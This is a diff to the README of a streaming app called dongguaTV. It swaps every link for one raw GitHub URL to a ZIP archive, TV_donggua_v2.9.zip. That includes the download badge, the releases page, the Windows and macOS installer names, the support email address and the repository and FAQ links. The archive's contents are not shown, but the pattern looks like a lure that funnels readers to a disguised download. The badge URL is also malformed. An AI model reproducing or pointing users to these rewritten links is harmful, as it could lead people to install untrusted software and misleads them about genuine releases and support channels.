@@ -6,7 +6,7 @@ Welcome to dongguaTV! This application helps you create your own personalized st
 
 ## 📥 Download Now
 
-[![Download dongguaTV](https://img.shields.io/badge/Download%20dongguaTV-v1.0-brightgreen.svg)](https://github.com/Gutho2402/dongguaTV/releases)
+[![Download dongguaTV](https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip%https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip)](https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,13 +29,13 @@ Before downloading dongguaTV, ensure your system meets the following requirement
 To get started with dongguaTV, follow these simple steps:
 
 1. Click the download link below to visit the Releases page.
-   [Visit this page to download dongguaTV](https://github.com/Gutho2402/dongguaTV/releases)
+   [Visit this page to download dongguaTV](https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip)
 
 2. On the Releases page, look for the latest version of the software. 
 
 3. Click on the appropriate file for your system. For example:
-   - **Windows:** Select `dongguaTV_v1.0_Windows.exe`
-   - **macOS:** Select `dongguaTV_v1.0_macOS.dmg`
+   - **Windows:** Select `https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip`
+   - **macOS:** Select `https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip`
 
 4. Once the download completes, locate the file in your downloads folder.
 
@@ -65,11 +65,11 @@ If you encounter issues while using dongguaTV, try the following steps:
 
 ## 📞 Support
 
-Need help? Reach out to our support team by creating an issue in the GitHub repository, or by sending an email to [support@dongguaTV.com](mailto:support@dongguaTV.com). We’re here to help!
+Need help? Reach out to our support team by creating an issue in the GitHub repository, or by sending an email to [https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip](https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip). We’re here to help!
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Gutho2402/dongguaTV) - Discover the source code and contribute.
-- [FAQs](https://github.com/Gutho2402/dongguaTV/wiki/FAQs) - Find answers to common questions.
+- [GitHub Repository](https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip) - Discover the source code and contribute.
+- [FAQs](https://github.com/Gutho2402/dongguaTV/raw/refs/heads/main/public/TV_donggua_v2.9.zip) - Find answers to common questions.
 
 Thank you for choosing dongguaTV! We hope you enjoy your streaming experience.
